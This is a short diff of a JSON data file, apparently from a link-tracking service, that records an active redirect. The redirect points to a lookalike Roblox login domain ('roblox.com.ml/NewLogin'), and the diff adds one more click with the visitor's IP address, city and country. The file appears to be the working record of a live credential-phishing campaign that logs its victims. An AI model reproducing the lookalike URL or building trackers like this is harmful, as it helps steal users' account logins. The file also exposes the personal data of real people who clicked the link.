@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 72,
+    "useCount": 73,
     "createdBy": "admin",
     "clicks": [
       {
@@ -688,6 +688,14 @@
         "city": "Dallas",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1776900764012,
+        "ip": "190.72.218.36",
+        "country": "Venezuela",
+        "city": "Barcelona",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
